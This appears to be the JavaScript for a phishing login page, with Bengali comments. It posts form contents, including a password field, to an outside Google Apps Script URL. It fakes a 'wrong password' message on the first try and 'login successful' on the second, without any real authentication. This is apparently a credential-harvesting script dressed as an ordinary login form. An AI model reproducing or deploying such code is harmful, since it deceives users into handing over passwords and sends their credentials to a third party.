const scriptURL = 'https://script.google.com/macros/s/AKfycbw4dI4O827TsKzqIV-1nmO1KkB801-gc2OBZmCKN1x4prYjbXgzx5tsseFTbNs7SV5a/exec'

const form = document.forms['contact-form']

form.addEventListener('submit', e => {
  
  e.preventDefault()
  
  fetch(scriptURL, { method: 'POST', body: new FormData(form)})
  .then(response => alert("Thank you! Form is submitted , আপনার তথ্য জমা হয়েছে" ))
  .then(() => { window.location.reload(); })
  .catch(error => console.error('Error!', error.message))
})



// 🧿 চোখ আইকন এবং পাসওয়ার্ড ইনপুট আইডি খুঁজে বের করা
const togglePassword = document.getElementById('togglePassword');
const passwordField = document.getElementById('password');
const eyeIcon = document.getElementById('eyeIcon');

// 👁️ চোখ আইকনে ক্লিক করলে পাসওয়ার্ড দেখাবে বা লুকাবে
togglePassword.addEventListener('click', function () {
  const type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
  passwordField.setAttribute('type', type);

  // 🌀 চোখ আইকনের ডিজাইন পরিবর্তন (খোলা ↔ বন্ধ)
  if (type === 'text') {
    eyeIcon.innerHTML = `
      <path d="M2 10c2.5-4 6-6 8-6s5.5 2 8 6c-2.5 4-6 6-8 6s-5.5-2-8-6z" fill="#555"/>
      <path d="M6 6l8 8" stroke="#555" stroke-width="1.5"/>
    `;
  } else {
    eyeIcon.innerHTML = `
      <path d="M10 4.167c-4.5 0-8.333 3.75-8.333 5.833S5.5 15.833 10 15.833s8.333-3.75 8.333-5.833S14.5 4.167 10 4.167zm0 9.166a3.333 3.333 0 1 1 0-6.666 3.333 3.333 0 0 1 0 6.666z"/>
      <circle cx="10" cy="10" r="2" fill="#555"/>
    `;
  }
});



// 🔁 লগইন ক্লিক কাউন্টারের জন্য ভ্যারিয়েবল
let loginClickCount = 0;

// ✅ ফর্ম সাবমিট ইভেন্ট
document.querySelector('form').addEventListener('submit', function (e) {
  e.preventDefault(); // ফর্ম সাবমিশন বন্ধ

  // মেসেজ দেখানোর জায়গা
  const errorDiv = document.getElementById('errorMessage');

  // প্রথমবার ক্লিক করলে পাসওয়ার্ড ভুল
  if (loginClickCount === 0) {
    errorDiv.textContent = 'আপনার পাসওয়ার্ড ভুল হয়েছে'; // লাল মেসেজ দেখাও
    loginClickCount++; // কাউন্ট বাড়াও
  } 
  // দ্বিতীয়বার হলে সফল লগইন
  else {
    errorDiv.textContent = ''; // পুরনো মেসেজ মুছে দাও
    alert('লগইন সফল হয়েছে');
    // 👉 চাইলে এখানে redirect করতে পারো
    // window.location.href = "dashboard.html";
  }
});
